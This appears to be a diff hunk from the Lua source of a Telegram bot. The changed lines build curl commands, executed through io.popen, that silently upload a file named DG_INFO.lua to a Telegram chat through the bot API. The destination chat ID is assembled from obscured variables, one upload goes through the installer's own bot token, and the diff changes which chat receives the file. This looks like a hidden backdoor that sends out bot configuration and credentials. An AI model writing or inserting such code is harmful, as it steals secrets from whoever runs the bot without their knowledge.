@@ -13110,7 +13110,7 @@ end
 end
 end
 local ban1 = son .. lok
-local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. tonumber(timej) ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
+local curl = 'curl "'..'https://api.telegram.org/bot'.. tim ..'/sendDocument'..'" -F "chat_id='.. tonumber(ban1) ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
 local curl = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. tonumber(ban1) ..'" -F "document=@'..'DG_INFO.lua'..'"' io.popen(curl) -- نهايه
 end -- end new msg dev.mr sofi 
 end -- end callback dev.mr sofi
